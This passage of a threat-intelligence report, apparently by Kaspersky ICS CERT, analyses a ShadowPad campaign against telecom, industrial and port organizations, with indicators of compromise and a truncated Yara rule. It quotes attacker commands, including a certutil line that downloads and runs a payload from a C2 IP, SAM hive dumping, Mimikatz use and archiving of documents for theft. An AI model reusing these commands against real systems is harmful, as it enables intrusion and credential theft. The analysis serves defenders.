Infected machines\nincluded engineering computers in building automation systems that are part of the\ninfrastructure of a telecommunications company.\n\nDuring the investigation researchers uncovered larger-scale activity by the threat actor in\nthe network of the telecommunications company and also identified other victims of the\ncampaign. We found malicious artifacts in organizations in the industrial and\ntelecommunications sectors in both Pakistan and Afghanistan. Moreover, another attack\nwas uncovered, using an earlier, but with very similar set of tactics, techniques and\nprocedures (TTPs), against a logistics and transport organization (a port) in Malaysia.\n\nApparently, the wave of attacks uncovered by the experts began in March 2021.\n\n[Some of the victim organizations were breached by exploiting the CVE-2021-26855](https://ics-cert.kaspersky.com/away?url=https%3A%2F%2Fcve.mitre.org%2Fcgi-bin%2Fcvename.cgi%3Fname%3DCVE-2021-26855)\nvulnerability in Microsoft Exchange.\n\nDuring the investigation we found additional tools and commands used by the threat\nactor after the initial infection.\n\nFrom March to October 2021, the ShadowPad backdoor was downloaded to victim\ncomputers as the mscoree.dll file, which was launched by AppLaunch.exe – a\nperfectly legitimate application.\nLater the attackers launched ShadowPad using DLL hijacking in a legitimate OLECOM object viewing application (OleView).\nAfter the initial infection the attackers first sent commands manually, then\nautomatically.\nOther tools were also used:\n\nThe CobaltStrike framework, which was downloaded to victim machines using\nthe certutil.exe utility, compiled aspx web shells, and procdump and Mimikatz\ntools;\nThe PlugX backdoor;\nBAT files (for stealing credentials);\nWeb shells (for remote access to the web server);\nThe Nextnet utility (for scanning network hosts).\n\n\n-----\n\nThe attackers used domains registered with NameSilo, GoDaddy.com and ENOM to\ncommunicate with the command-and-control (C2) servers. Most of the C2 servers were\nhosted on dedicated servers rented from Choopa.\n\nThe newly identified attacks on a variety of organizations had an almost totally unique set\nof TTPs, which leads us to believe that the same Chinese-speaking threat actor was\nbehind all of these attacks.\n\nAt the time of writing, we do not know the ultimate goal of the attacker. We think it was\nprobably data harvesting.\n\nWe believe that it is highly likely that this threat actor will strike again and we will find\nnew victims in different countries.\n\n[The full report is available on the Kaspersky Threat Intelligence portal.](https://www.kaspersky.com/enterprise-security/threat-intelligence)\n\n[For more information please contact ics-cert@kaspersky.com.](mailto:ics-cert@kaspersky.com)\n\n### Initial infection\n\nIn mid-October 2021, Kaspersky ICS CERT experts discovered an active ShadowPad\nbackdoor that affected a number of industrial control systems in Pakistan, specifically\nengineering computers in building automation systems that are part of a telecom\ncompany’s infrastructure. A further analysis of the attack revealed other organizations\naffected by it – manufacturing and telecommunications companies in Pakistan, a\ntelecomnunications company in Afghanistan, and a logistics and transport organization (a\nport) in Malaysia. Apparently, the wave of attacks uncovered by the experts began in\nMarch 2021.\n\nThe attackers exploited a known vulnerability in MS Exchange, CVE-2021-26855, as the\ninitial attack vector in several victim organizations. We do not have evidence that CVE2021-26855 was exploited in all cases of attack identified, but we can assume that the\nattackers could use this particular vector to penetrate in other cases, as well.\n\n### ShadowPad\n\nIn the course of our investigation, we determined that in the beginning of March 2021,\nthe ShadowPad backdoor was downloaded on the attacked computers under the guise of\nthe mscoree.dll file, which was launched by the legitimate application AppLaunch.exe\nlocated in the same folder with ShadowPad. AppLaunch.exe was executed by creating a\ntask in the Windows Task Scheduler.\n\n\n-----\n\nExport table of the mscoree.dll (ShadowPad) maliciouis DLL\n\nIn some of the cases we studied at the same time, we found that a ShadowPad sample that\nhad the same name and launching scheme was executed by exploiting the MS Exchange\nCVE-2021-26855 vulnerability.\n\nSince about mid-October 2021, a new ShadowPad launching scheme and a new version of\nthe malware has been used targeting the same organizations. Instead of using\nmscoree.dll, the attackers switched to using the dll hijacking technique in legitimate\nsoftware for viewing OLE-COM objects (OleView). The legitimate OleView application\ndownloads the malicious IVIEWERS.dll library, which in turn downloads and executes\nthe ShadowPad payload contained in IVIEWERS.dll.dat.\n\nThe Windows Task Scheduler was also used for the new ShadowPad version to get a\nfoothold in a system. In total, we managed to find 25 unique modifications.\n\nA more detailed analysis of some modifications of the new ShadowPad version is\n[presented in a recent report published by PwC.](https://ics-cert.kaspersky.com/away?url=https%3A%2F%2Fwww.pwc.co.uk%2Fissues%2Fcyber-security-services%2Fresearch%2Fchasing-shadows.html)\n\n### Post-exploitation\n\nWe found that on a subset of computers (at least one in each attacked organization’s\nnetwork), some series of commands had been remotely executed via the command line\ninterface (cmd.exe).\n\nAt first, the attackers entered the commands manually (this is indicated by both the time\nintervals between commands and the resulting output not being redirected to anything\nother than standard output).\n\nThe list of commands executed by the attackers manually is shown in the original\nsequence in the table below.\n\n\n-----\n\n**Command** **Description**\n\ncmd.exe /C arp -a > $temp\\gGjrIFGa.tmp 2>&1 output the current ARP cache\ntable for all interfaces to a file in\nthe $temp directory\n\nquser.exe collect information about users\nauthorized in the system\n\n\nnetstat -ano\nnetstat user\n\nxcopy.exe /s $user\\desktop\nc:\\$recycle.bin\\temp\\■■■\\\n\nping.exe 8,8,8,8\nping.exe google.com\nping.exe 167.179.64.62\n\n\ncollect information about active\nusers and network connections\n\ncopy all files from the desktop to\nthe recycle.bin folder (it is worth\nnoting that the organization’s\ndomain name is also present in\nthe path)\n\ncheck the availability of internet\nservices, probably including the\nattackers’ infrastructure\n\n\nnet use \\\\10.126.209.24 “■■■■■■■” /u:■■\\■■■■■ mount a network drive using a\nlegitimate domain account\n\ncmd.exe m1.log launch TrojanPSW.Win32.Mimikatz\n\nreg.exe save hklm\\sam sam.hive save registry key containing\nNTLM hashes to disk\n\n\ncmd.exe /C $programfiles\\winrar\\rar.exe a -r hp1234 C:$recycle.bin\\10020111desk.rar\n$user\\desktop\\*.txt $user\\desktop\\*.xls*\n$user\\desktop\\*.pdf $user\\desktop\\*.doc*\n$user\\desktop\\*.jpg > $temp\\lwefqERM.tmp 2>&1\n\n\narchive the files collected that\npotentially contain confidential\ninformation\n\n\nwinrar.exe a -r -ep1 -p3210 -m5 -s -iback nat temp archive the files collected using\nthe console version of WinRar\n\n\n$windir\\appcompat\\programs\\xerice.exe\n10.251.115.0/24\n\n\nscan hosts on the network using\nthe nextnet utility (an opensource tool written in Go)\n\n\nLater, the attackers began to distribute a malicious script for cmd.exe over the networks\nof attacked organizations. The script was almost completely identical (in terms of its\ncontents and the sequence of commands) to the manual activity sequence detected\nearlier, but it contained an operator to redirect the output of execution results to a file.\n\nThe script for cmd.exe that was discovered was not only delivered over the network, but\nwas also added by the attackers to the task scheduler for daily execution.\n\n\n-----\n\nExample of a script designed to automate the process of collecting data on attacked computers\n\nIt is important to note that this part of the TTPs is quite unique and we believe it supports\nattributing all cases of similar activity to one Chinese-speaking group of attackers.\n\nThe artifacts found indicate that the attackers stole domain authentication credentials\nfrom at least one account in each attacked organization (probably from the same\ncomputer that was used to penetrate the network). These credentials were used to further\nspread the attack over the network, first manually and then in automatic mode.\n\n### Additional tools\n\n#### CobaltStrike\n\nThe attackers used CobaltStrike, which was downloaded to the victim’s computer using\nthe certutil.exe utility, compiled aspx webshells, the procdump tool, and Mimikatz.\n\nCobaltStrike was downloaded using the following command:\n\n\"$system32\\cmd.exe\" /c certutil.exe -urlcache -split -f\nhxxp://116.206.92[.]26:82/update.exe &amp;&amp; update.exe &amp;&amp;\ncertutil.exe -urlcache -split -f hxxp://116.206.92[.]26:82/update.exe delete\n\n#### PlugX backdoor – aro.dat\n\nIn addition to the ShadowPad backdoor, activity associated with downloading aro.dat, a\nvariant of the PlugX backdoor, using bitsadmin was identified on the server of one of the\nvictims.\n\nDownloading aro.dat backdoor\n\n[A description of the PlugX backdoor is provided in an article published by Palo Alto](https://ics-cert.kaspersky.com/away?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fthor-plugx-variant%2F)\nNetworks.\n\n\n-----\n\n#### Bat file for credential theft\n\nA bat file was found on a mail server of one of the victims, which the attackers used to\ncollect information and steal the NTLM hashes of accounts.\n\nBat file found on a victim’s server\n\n[The contents of this file are very similar to the bat file described in a VB article, which](https://ics-cert.kaspersky.com/away?url=https%3A%2F%2Fvblocalhost.com%2Fuploads%2FVB2021-Yona-Salem.pdf)\nmentions that the script was used by the Chinese group HAFNIUM.\n\n#### Webshell\n\nMalicious dll files were found on the victim’s mail servers. These are compiled .NET\nAssembly files for aspx scripts used by the actor for remote access to the web server\n(webshell).\n\nExample of malicious dll webshell\n\nThe sequence of commands sent by default to the victim’s webshell was tracked earlier in\n[the well-known China Chopper Webshell:](https://ics-cert.kaspersky.com/away?url=https%3A%2F%2Fwww.mandiant.com%2Fresources%2Fbreaking-down-the-china-chopper-web-shell-part-ii)\n\n\n-----\n\n\"cmd\" /c cd /d \"C:/inetpub/wwwroot/aspnet_client\"&amp;whoami&amp;echo\n\n[S]&amp;cd&amp;echo [E]\"\n\n### Infrastructure\n\nThe ShadowPad CnC servers found are mostly hosted on rented dedicated Choopa\nservers.\n\n**Domain** **IP** **First seen** **ASN**\n\n**order.cargobussiness[.]site** 45.77.249[.]48 March 24, 2021 20473\n\n**documents.kankuedu[.]org** 45.76.54[.]156 March 23, 2021 20473\n\n**live.musicweb[.]xyz** 192.248.151[.]110 March 17, 2021\n\n**obo.videocenter[.]org** – May 21, 2021\n\n\n**tech.obj[.]services** 108.160.133[.]247\n\n103.152.255[.]82\n\n**houwags.defineyourid[.]site** 107.191.47[.]52\n\n198.13.44[.]48\n\n95.179.142[.]104\n\n**noub.crabdance[.]com** 45.77.243[.]204\n\n45.32.101[.]196\n\n95.179.142[.]104\n\n192.248.180[.]109\n\n**grandfoodtony[.]com** –\n\n### Victims\n\n\nOctober 21, 2021\n\nOctober 18, 2021\n\nOctober 28, 2021\n\nOctober 13, 2021\n\nOctober 29, 2021\n\nOctober 02, 2021\n\nOctober 19, 2021\n\nOctober 28, 2021\n\nOctober 28, 2021\n\n\n20473\n\n20473\n\n20473\n\n\nWe identified malicious artifacts in organizations located in Pakistan and Afghanistan\nand operating in manufacturing & telecom sectors. The attack using older TTPs and\nexploiting the Microsoft Exchange vulnerability also targeted a logistics and\ntransportation organization (a port) in Malaysia.\n\n### Attribution\n\nWe believe with a high degree of confidence that a Chinese-speaking threat actor is\nbehind the activity described in this report.\n\nThere are some minor references to HAFNUIM, a Chinese-speaking threat actor, but they\nare not sufficient to speak of HAFNUM’s involvement in attacks described in this report\nwith a high degree of confidence.\n\n\n-----\n\nThe Mimikatz utility (m1.log, SHA256:\n30a78770615c6b42c17900c4ad03a9b708dc2d9b743bbdc51218597518749382),\nwhich was identified during our investigation on computers of organizations in\n[Pakistan, Malaysia, and Afghanistan, was also mentioned in a Symantec report. The](https://ics-cert.kaspersky.com/away?url=https%3A%2F%2Fsymantec-enterprise-blogs.security.com%2Fblogs%2Fthreat-intelligence%2Fmicrosoft-exchange-server-protection)\nreport also claims that the threat actor HAFNIUM was involved in attacks\nexploiting a Microsoft Exchange Server vulnerability.\nIn addition, a bat file for stealing NTLM hashes of accounts was found on a server of\none of the victims. The contents of the bat file found are very similar to the bat file\n[described in the VB article, which mentions that this script was used by HAFNIUM.](https://ics-cert.kaspersky.com/away?url=https%3A%2F%2Fvblocalhost.com%2Fuploads%2FVB2021-Yona-Salem.pdf)\n\nActivity related to downloading the PlugX backdoor (aro.dat), which occurred on the\n[server of one of the victims, was analyzed in the Palo Alto Networks report, which alleges](https://ics-cert.kaspersky.com/away?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fthor-plugx-variant%2F)\nthe involvement of a Chinese group known as PKPLUG.\n\n### Conclusion\n\nAs mentioned above, building automation systems were among the systems attacked in\nthe campaign described in this report. We often see accidental infections on such systems,\nbut they are rare targets for APT actors. Although the final goals of the attack remain\nunknown, the attackers are most likely interested in gathering information. We strongly\nbelieve that those systems themselves could be a valuable source of highly confidential\ninformation. Additionally, we believe there is a chance that they also provide attackers\nwith a backdoor to other, more strictly secured, infrastructure.\n\nThe attackers’ TTPs enabled us to link these attacks to a Chinese-speaking threat actor,\nand we observed victims located in different regions. This means that the actor we have\nidentified may have broader geographical interests and we could expect more victims to\nbe discovered in different countries in the future.\n\n### Appendix I – Indicators of Compromise\n\n**ShadowPad (mscoree.dll)**\n\n91131CCF507F61279268FA857AB53463\n\n8D5807D8EE69E472764FAEE7269B460B\n\n1A5856C343597DC219E3F5456018612B\n\n27F636A36207581E75C700C0E36A8031\n\n**ShadowPad (iviewers.dll)**\n\n011BEAF3E9CD2896479313772CD591DE\n\nA7F3BF89F0B41704F185545C784B8457\n\n\n-----\n\n35912C914BD84F23203C8FADAC6D0548\n\n299980C914250BAC7522DE849F6DF24F\n\n381616642D2567F8872B150B37E5196B\n\n31FDAE0B71C290440E0B465B17CF3C8D\n\n420FCF11240589E8D29DAAB08251831D\n\n40CD646554ED42D385CA6B55B9D3397D\n\n61BA23B3B3D132FE0825907C0EA58399\n\n0CAC537476FD71763C07EDFD7D831F0F\n\n80EE7A1E9AD4AC6AFCAC83087DC5360F\n\n**Bat file for credential theft:**\n\n74E43ECA18E8C92CB332BBB671CE13B8\n\n**Trojan-PSW.Win32.Mimikatz.eni (m1.log)**\n\nC024E5163AB6DD844813BF0D9A6F082B\n\n**Nextnet (xerice.exe)**\n\n86B25E416EEE0F5FB17370F3929E45F4\n\n8EE863C926D6847D1BF767783E700248\n\n**Domains and IPs (ShadowPad C&C)**\n\nhttps://order.cargobussiness[.]site\n\nhttps://documents.kankuedu[.]org\n\nhttps://live.musicweb[.]xyz\n\nhttps://obo.videocenter[.]org\n\nhttps://tech.obj[.]services\n\nhttps://houwags.defineyourid[.]site\n\nhttps://noub.crabdance[.]com\n\nhttps://grandfoodtony[.]com\n\n**CobaltStrike hosting and C&C**\n\n\n-----\n\nstorage.ondriev[.]tk 116.206.92[.]26\n\napi.onedriev[.]tk 69.172.80[.]131\n\n**Yara rules**\n\nimport \"pe\"\n\nrule apt_shadowpad_iviewers_dll_variant\n\n{\n\nmeta:\n\ndescription = \"Rule for detecting Shadowpad iviewers.dll variant\"\n\nauthor = \"Kaspersky\"\n\ncopyright = \"Kaspersky\"\n\ndistribution = \"DISTRIBUTION IS FORBIDDEN.
